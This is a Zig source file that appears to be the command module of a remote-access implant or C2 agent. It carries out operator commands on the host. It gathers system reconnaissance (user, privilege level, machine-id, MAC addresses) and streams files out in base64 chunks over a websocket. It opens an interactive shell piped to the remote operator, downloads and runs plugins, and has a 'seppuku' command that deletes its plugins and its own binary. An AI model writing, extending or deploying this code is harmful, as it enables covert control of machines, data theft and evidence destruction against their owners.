const std = @import("std");
const builtin = @import("builtin");
const Allocator = std.mem.Allocator;
const protocol = @import("protocol.zig");
const websocket = @import("websocket.zig");
const plugin_runtime = @import("plugin_runtime.zig");

pub const Action = enum { shell, seppuku };
pub const Result = union(enum) {
    output: []const u8,
    action: Action,
};

pub fn dispatch(allocator: Allocator, cmd: []const u8, args: []const []const u8) !Result {
    if (eql(cmd, "pwd")) return .{ .output = try cmdPwd(allocator) };
    if (eql(cmd, "ls")) return .{ .output = try cmdLs(allocator, args) };
    if (eql(cmd, "cat")) return .{ .output = try cmdCat(allocator, args) };
    if (eql(cmd, "find")) return .{ .output = try cmdFind(allocator, args) };
    if (eql(cmd, "cp")) return .{ .output = try cmdCp(allocator, args) };
    if (eql(cmd, "mv")) return .{ .output = try cmdMv(allocator, args) };
    if (eql(cmd, "rm")) return .{ .output = try cmdRm(allocator, args) };
    if (eql(cmd, "systeminfo")) return .{ .output = try cmdSystemInfo(allocator) };
    if (eql(cmd, "plugin")) return .{ .output = try cmdPlugin(allocator, args) };
    if (eql(cmd, "shell")) return .{ .action = .shell };
    if (eql(cmd, "seppuku")) return .{ .action = .seppuku };
    return .{ .output = try std.fmt.allocPrint(allocator, "error: unknown command '{s}'", .{cmd}) };
}

// ---------------------------------------------------------------------------
// Built-in commands
// ---------------------------------------------------------------------------

fn cmdPwd(allocator: Allocator) ![]const u8 {
    return std.fs.cwd().realpathAlloc(allocator, ".");
}

fn cmdLs(allocator: Allocator, args: []const []const u8) ![]const u8 {
    const path = if (args.len > 0) args[0] else ".";
    var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot open '{s}': {}", .{ path, e });
    defer dir.close();

    var out: std.ArrayList(u8) = .{};
    errdefer out.deinit(allocator);
    var it = dir.iterate();
    while (try it.next()) |entry| {
        const kind: u8 = switch (entry.kind) {
            .directory => 'd',
            .sym_link => 'l',
            .file => '-',
            else => '?',
        };
        try out.writer(allocator).print("{c}  {s}\n", .{ kind, entry.name });
    }
    if (out.items.len == 0) try out.appendSlice(allocator, "(empty directory)\n");
    return out.toOwnedSlice(allocator);
}

fn cmdCat(allocator: Allocator, args: []const []const u8) ![]const u8 {
    if (args.len == 0) return allocator.dupe(u8, "usage: cat <file_path>");
    const file = std.fs.cwd().openFile(args[0], .{}) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot open '{s}': {}", .{ args[0], e });
    defer file.close();
    const buf = try allocator.alloc(u8, 1024);
    const n = file.read(buf) catch |e|
        return std.fmt.allocPrint(allocator, "error: read failed: {}", .{e});
    return allocator.realloc(buf, n);
}

fn cmdFind(allocator: Allocator, args: []const []const u8) ![]const u8 {
    if (args.len < 2) return allocator.dupe(u8, "usage: find <folder_path> <pattern>");
    const root = args[0];
    const pattern = args[1];

    var dir = std.fs.cwd().openDir(root, .{ .iterate = true }) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot open '{s}': {}", .{ root, e });
    defer dir.close();

    var out: std.ArrayList(u8) = .{};
    errdefer out.deinit(allocator);

    var walker = dir.walk(allocator) catch |e|
        return std.fmt.allocPrint(allocator, "error: walk failed: {}", .{e});
    defer walker.deinit();

    var count: usize = 0;
    while (walker.next() catch null) |entry| {
        if (globMatchInsensitive(pattern, entry.basename)) {
            try out.writer(allocator).print("{s}/{s}\n", .{ root, entry.path });
            count += 1;
            if (count >= 500) {
                try out.appendSlice(allocator, "... (truncated at 500 results)\n");
                break;
            }
        }
    }
    if (count == 0) try out.appendSlice(allocator, "(no matches)\n");
    return out.toOwnedSlice(allocator);
}

fn cmdCp(allocator: Allocator, args: []const []const u8) ![]const u8 {
    if (args.len < 2) return allocator.dupe(u8, "usage: cp <source> <dest>");
    const src = args[0];
    const dst = args[1];

    std.fs.cwd().copyFile(src, std.fs.cwd(), dst, .{}) catch |e|
        return std.fmt.allocPrint(allocator, "error: copy failed: {}", .{e});
    return std.fmt.allocPrint(allocator, "copied '{s}' -> '{s}'", .{ src, dst });
}

fn cmdMv(allocator: Allocator, args: []const []const u8) ![]const u8 {
    if (args.len < 2) return allocator.dupe(u8, "usage: mv <source> <dest>");
    const src = args[0];
    const dst = args[1];

    std.fs.cwd().rename(src, dst) catch |e|
        return std.fmt.allocPrint(allocator, "error: move failed: {}", .{e});
    return std.fmt.allocPrint(allocator, "moved '{s}' -> '{s}'", .{ src, dst });
}

fn cmdRm(allocator: Allocator, args: []const []const u8) ![]const u8 {
    if (args.len == 0) return allocator.dupe(u8, "usage: rm <file_path>");
    const path = args[0];
    std.fs.cwd().deleteFile(path) catch |e|
        return std.fmt.allocPrint(allocator, "error: cannot remove '{s}': {}", .{ path, e });
    return std.fmt.allocPrint(allocator, "removed '{s}'", .{path});
}

fn cmdSystemInfo(allocator: Allocator) ![]const u8 {
    var out: std.ArrayList(u8) = .{};
    errdefer out.deinit(allocator);
    const w = out.writer(allocator);

    try w.print("hostname  : {s}\n", .{hostname()});
    try w.print("user      : {s}\n", .{currentUser(allocator)});
    try w.print("os        : {s}\n", .{@tagName(builtin.os.tag)});
    appendFileFieldInline(w, "os version", "/etc/os-release", "PRETTY_NAME=");
    try w.print("arch      : {s}\n", .{@tagName(builtin.cpu.arch)});
    try w.print("privilege : {s}\n", .{privilegeLevel()});
    try w.print("language  : {s}\n", .{envOrDefault(allocator, "LANG", "unknown")});

    if (builtin.os.tag == .linux) {
        appendCpuInfo(w);
        appendMemInfo(w);
        appendFileField(w, "machine-id", "/etc/machine-id");
    }

    appendNetworkInfo(allocator, w);

    return out.toOwnedSlice(allocator);
}

fn cmdPlugin(allocator: Allocator, args: []const []const u8) ![]const u8 {
    if (args.len == 0) return allocator.dupe(u8,
        "usage: plugin <subcommand>\n\n" ++
        "  plugin list                 List available plugins\n" ++
        "  plugin install <name>       Download and install a plugin\n" ++
        "  plugin uninstall <name>     Remove an installed plugin\n" ++
        "  plugin run <name> [args]    Run an installed plugin",
    );

    if (eql(args[0], "list")) {
        return plugin_runtime.listPackages(allocator);
    }

    if (eql(args[0], "install")) {
        if (args.len < 2) return allocator.dupe(u8, "usage: plugin install <name>");
        return plugin_runtime.install(allocator, args[1]);
    }

    if (eql(args[0], "uninstall")) {
        if (args.len < 2) return allocator.dupe(u8, "usage: plugin uninstall <name>");
        return plugin_runtime.uninstall(allocator, args[1]);
    }

    if (eql(args[0], "run")) {
        if (args.len < 2) return allocator.dupe(u8, "usage: plugin run <name> [args...]");
        return plugin_runtime.execute(allocator, args[1], if (args.len > 2) args[2..] else &.{});
    }

    return std.fmt.allocPrint(allocator, "error: unknown subcommand '{s}'. Run 'plugin' for usage.", .{args[0]});
}

// ---------------------------------------------------------------------------
// File-transfer helpers (called from main)
// ---------------------------------------------------------------------------

pub fn handleDownload(
    allocator: Allocator,
    stream: std.net.Stream,
    write_mutex: *std.Thread.Mutex,
    agent_id: []const u8,
    msg_id: []const u8,
    path: []const u8,
) !void {
    const file = try std.fs.cwd().openFile(path, .{});
    defer file.close();
    const stat = try file.stat();
    const basename = std.fs.path.basename(path);

    const meta = try protocol.serialize(allocator, protocol.FileMetaMsg{
        .id = msg_id,
        .agent_id = agent_id,
        .timestamp = protocol.timestamp(),
        .payload = .{ .direction = "download", .filename = basename, .size = stat.size },
    });
    defer allocator.free(meta);
    {
        write_mutex.lock();
        defer write_mutex.unlock();
        try websocket.sendText(stream, meta);
    }

    var offset: u64 = 0;
    var read_buf: [48000]u8 = undefined;
    while (true) {
        const n = try file.read(&read_buf);
        if (n == 0) break;
        const b64 = b64Encode(allocator, read_buf[0..n]) catch break;
        defer allocator.free(b64);
        const is_final = n < read_buf.len;
        const chunk = try protocol.serialize(allocator, protocol.FileChunkMsg{
            .id = msg_id,
            .agent_id = agent_id,
            .timestamp = protocol.timestamp(),
            .payload = .{ .offset = offset, .data = b64, .final = is_final },
        });
        defer allocator.free(chunk);
        {
            write_mutex.lock();
            defer write_mutex.unlock();
            try websocket.sendText(stream, chunk);
        }
        offset += n;
        if (is_final) break;
    }
}

pub fn handleUpload(
    allocator: Allocator,
    dest_path: []const u8,
    payload: std.json.ObjectMap,
) !void {
    const b64_data = protocol.getStr(payload, "data") orelse return error.MissingData;
    const is_final = blk: {
        const v = payload.get("final") orelse break :blk false;
        break :blk switch (v) {
            .bool => |b| b,
            else => false,
        };
    };
    _ = is_final;

    const decoded_size = std.base64.standard.Decoder.calcSizeForSlice(b64_data) catch return error.InvalidBase64;
    const decoded = try allocator.alloc(u8, decoded_size);
    defer allocator.free(decoded);
    std.base64.standard.Decoder.decode(decoded, b64_data) catch return error.InvalidBase64;

    const file = try std.fs.cwd().createFile(dest_path, .{ .truncate = false });
    defer file.close();
    const off_val = protocol.getInt(payload, "offset");
    if (off_val) |o| try file.seekTo(@intCast(o));
    try file.writeAll(decoded);
}

// ---------------------------------------------------------------------------
// Shell session
// ---------------------------------------------------------------------------

pub const ShellSession = struct {
    child: std.process.Child,
    stdout_thread: std.Thread,
    stderr_thread: std.Thread,
    stdin_fd: std.fs.File,
    sid_owned: []const u8,
    allocator: Allocator,

    pub fn writeInput(self: *ShellSession, data: []const u8) void {
        self.stdin_fd.writeAll(data) catch {};
    }

    pub fn close(self: *ShellSession) void {
        self.stdin_fd.close();
        self.stdout_thread.join();
        self.stderr_thread.join();
        _ = self.child.wait() catch {};
        self.allocator.free(self.sid_owned);
    }
};

pub fn startShell(
    allocator: Allocator,
    stream: std.net.Stream,
    write_mutex: *std.Thread.Mutex,
    agent_id: []const u8,
    session_id: []const u8,
) ?ShellSession {
    const shell_path: []const u8 = switch (builtin.os.tag) {
        .windows => "cmd.exe",
        else => "/bin/sh",
    };

    // Dupe session_id — the original points into a parsed JSON message
    // that is freed when handleText returns, but reader threads outlive it.
    const sid_owned = allocator.dupe(u8, session_id) catch return null;

    var child = std.process.Child.init(&.{shell_path}, allocator);
    child.stdin_behavior = .Pipe;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.spawn() catch {
        allocator.free(sid_owned);
        return null;
    };

    const stdin_fd = child.stdin.?;
    const stdout_fd = child.stdout.?;
    const stderr_fd = child.stderr.?;

    const ReaderCtx = struct {
        a: Allocator,
        s: std.net.Stream,
        wm: *std.Thread.Mutex,
        aid: []const u8,
        sid: []const u8,
    };
    const ctx = ReaderCtx{
        .a = allocator,
        .s = stream,
        .wm = write_mutex,
        .aid = agent_id,
        .sid = sid_owned,
    };

    const pipeReader = struct {
        fn run(c: ReaderCtx, fd: std.fs.File, send_eof: bool) void {
            var buf: [4096]u8 = undefined;
            while (true) {
                const n = fd.read(&buf) catch break;
                if (n == 0) break;
                const msg = protocol.serialize(c.a, protocol.ShellDataMsg{
                    .id = c.sid,
                    .agent_id = c.aid,
                    .timestamp = protocol.timestamp(),
                    .payload = .{ .data = buf[0..n] },
                }) catch continue;
                defer c.a.free(msg);
                c.wm.lock();
                defer c.wm.unlock();
                websocket.sendText(c.s, msg) catch {};
            }
            if (send_eof) {
                const eof_msg = protocol.serialize(c.a, protocol.ShellDataMsg{
                    .id = c.sid,
                    .agent_id = c.aid,
                    .timestamp = protocol.timestamp(),
                    .payload = .{ .data = "", .eof = true },
                }) catch return;
                defer c.a.free(eof_msg);
                c.wm.lock();
                defer c.wm.unlock();
                websocket.sendText(c.s, eof_msg) catch {};
            }
        }
    }.run;

    const t1 = std.Thread.spawn(.{}, pipeReader, .{ ctx, stdout_fd, true }) catch return null;
    const t2 = std.Thread.spawn(.{}, pipeReader, .{ ctx, stderr_fd, false }) catch return null;

    return ShellSession{
        .child = child,
        .stdout_thread = t1,
        .stderr_thread = t2,
        .stdin_fd = stdin_fd,
        .sid_owned = sid_owned,
        .allocator = allocator,
    };
}

pub fn doSeppuku() void {
    std.fs.cwd().deleteTree("plugins") catch {};
    var buf: [std.fs.max_path_bytes]u8 = undefined;
    if (std.fs.selfExePath(&buf)) |path| {
        std.fs.deleteFileAbsolute(path) catch {};
    } else |_| {}
    std.process.exit(0);
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn eql(a: []const u8, b: []const u8) bool {
    return std.mem.eql(u8, a, b);
}

fn hostname() []const u8 {
    const Static = struct {
        var buf: [256]u8 = undefined;
        var len: usize = 0;
    };
    if (Static.len > 0) return Static.buf[0..Static.len];
    if (builtin.os.tag == .linux or builtin.os.tag == .macos) {
        const f = std.fs.openFileAbsolute("/etc/hostname", .{}) catch return "unknown";
        defer f.close();
        Static.len = f.read(&Static.buf) catch return "unknown";
        const h = std.mem.trim(u8, Static.buf[0..Static.len], &std.ascii.whitespace);
        Static.len = h.len;
        std.mem.copyForwards(u8, Static.buf[0..h.len], h);
        return Static.buf[0..Static.len];
    }
    return "unknown";
}

fn privilegeLevel() []const u8 {
    if (builtin.os.tag == .windows) return "user";
    const uid = std.os.linux.getuid();
    return if (uid == 0) "root" else "user";
}

fn currentUser(allocator: Allocator) []const u8 {
    const user = std.process.getEnvVarOwned(allocator, "USER") catch
        return "unknown";
    return user;
}

fn envOrDefault(allocator: Allocator, key: []const u8, default: []const u8) []const u8 {
    const val = std.process.getEnvVarOwned(allocator, key) catch
        return default;
    return val;
}

fn appendFileField(w: anytype, label: []const u8, path: []const u8) void {
    const f = std.fs.openFileAbsolute(path, .{}) catch return;
    defer f.close();
    var buf: [256]u8 = undefined;
    const n = f.read(&buf) catch return;
    w.print("{s}: {s}\n", .{ label, std.mem.trim(u8, buf[0..n], &std.ascii.whitespace) }) catch {};
}

fn appendFileFieldInline(w: anytype, label: []const u8, path: []const u8, prefix: []const u8) void {
    const f = std.fs.openFileAbsolute(path, .{}) catch return;
    defer f.close();
    var buf: [4096]u8 = undefined;
    const n = f.read(&buf) catch return;
    const content = buf[0..n];
    var line_it = std.mem.splitScalar(u8, content, '\n');
    while (line_it.next()) |line| {
        if (std.mem.startsWith(u8, line, prefix)) {
            var val = line[prefix.len..];
            if (val.len >= 2 and val[0] == '"' and val[val.len - 1] == '"')
                val = val[1 .. val.len - 1];
            w.print("{s: <10}: {s}\n", .{ label, val }) catch {};
            return;
        }
    }
}

fn appendCpuInfo(w: anytype) void {
    if (builtin.os.tag != .linux) return;
    const f = std.fs.openFileAbsolute("/proc/cpuinfo", .{}) catch return;
    defer f.close();
    var buf: [8192]u8 = undefined;
    const n = f.read(&buf) catch return;
    const content = buf[0..n];

    var model: []const u8 = "unknown";
    var cores: u32 = 0;

    var line_it = std.mem.splitScalar(u8, content, '\n');
    while (line_it.next()) |line| {
        if (std.mem.startsWith(u8, line, "model name")) {
            if (std.mem.indexOf(u8, line, ": ")) |idx| {
                model = std.mem.trim(u8, line[idx + 2 ..], &std.ascii.whitespace);
            }
        }
        if (std.mem.startsWith(u8, line, "processor")) cores += 1;
    }
    w.print("cpu       : {s} ({d} cores)\n", .{ model, cores }) catch {};
}

fn appendMemInfo(w: anytype) void {
    if (builtin.os.tag != .linux) return;
    const f = std.fs.openFileAbsolute("/proc/meminfo", .{}) catch return;
    defer f.close();
    var buf: [4096]u8 = undefined;
    const n = f.read(&buf) catch return;
    const content = buf[0..n];

    var total_kb: u64 = 0;
    var avail_kb: u64 = 0;

    var line_it = std.mem.splitScalar(u8, content, '\n');
    while (line_it.next()) |line| {
        if (std.mem.startsWith(u8, line, "MemTotal:")) {
            total_kb = parseMemValue(line);
        } else if (std.mem.startsWith(u8, line, "MemAvailable:")) {
            avail_kb = parseMemValue(line);
        }
    }

    if (total_kb > 0) {
        const total_mb = total_kb / 1024;
        const avail_mb = avail_kb / 1024;
        const used_mb = total_mb - avail_mb;
        w.print("memory    : {d} MB used / {d} MB total ({d} MB available)\n", .{ used_mb, total_mb, avail_mb }) catch {};
    }
}

fn parseMemValue(line: []const u8) u64 {
    const colon = std.mem.indexOf(u8, line, ":") orelse return 0;
    const trimmed = std.mem.trim(u8, line[colon + 1 ..], &std.ascii.whitespace);
    const space = std.mem.indexOf(u8, trimmed, " ") orelse trimmed.len;
    return std.fmt.parseInt(u64, trimmed[0..space], 10) catch 0;
}

fn appendNetworkInfo(_: Allocator, w: anytype) void {
    if (builtin.os.tag != .linux) return;
    var dir = std.fs.openDirAbsolute("/sys/class/net", .{ .iterate = true }) catch return;
    defer dir.close();
    var it = dir.iterate();
    while (it.next() catch null) |entry| {
        if (eql(entry.name, "lo")) continue;
        var abuf: [256]u8 = undefined;
        const apath = std.fmt.bufPrint(&abuf, "/sys/class/net/{s}/address", .{entry.name}) catch continue;
        const f = std.fs.openFileAbsolute(apath, .{}) catch continue;
        defer f.close();
        var mbuf: [64]u8 = undefined;
        const n = f.read(&mbuf) catch continue;
        w.print("iface     : {s}  mac={s}\n", .{
            entry.name,
            std.mem.trim(u8, mbuf[0..n], &std.ascii.whitespace),
        }) catch {};
    }
}

fn b64Encode(allocator: Allocator, data: []const u8) ![]const u8 {
    const size = std.base64.standard.Encoder.calcSize(data.len);
    const buf = try allocator.alloc(u8, size);
    _ = std.base64.standard.Encoder.encode(buf, data);
    return buf;
}

pub fn globMatchInsensitive(pattern: []const u8, name: []const u8) bool {
    var pi: usize = 0;
    var ni: usize = 0;
    var star_p: usize = pattern.len;
    var star_n: usize = 0;

    while (ni < name.len) {
        if (pi < pattern.len and (pattern[pi] == '?' or toLower(pattern[pi]) == toLower(name[ni]))) {
            pi += 1;
            ni += 1;
        } else if (pi < pattern.len and pattern[pi] == '*') {
            star_p = pi;
            star_n = ni;
            pi += 1;
        } else if (star_p < pattern.len) {
            pi = star_p + 1;
            star_n += 1;
            ni = star_n;
        } else {
            return false;
        }
    }
    while (pi < pattern.len and pattern[pi] == '*') pi += 1;
    return pi == pattern.len;
}

fn toLower(c: u8) u8 {
    return if (c >= 'A' and c <= 'Z') c + 32 else c;
}
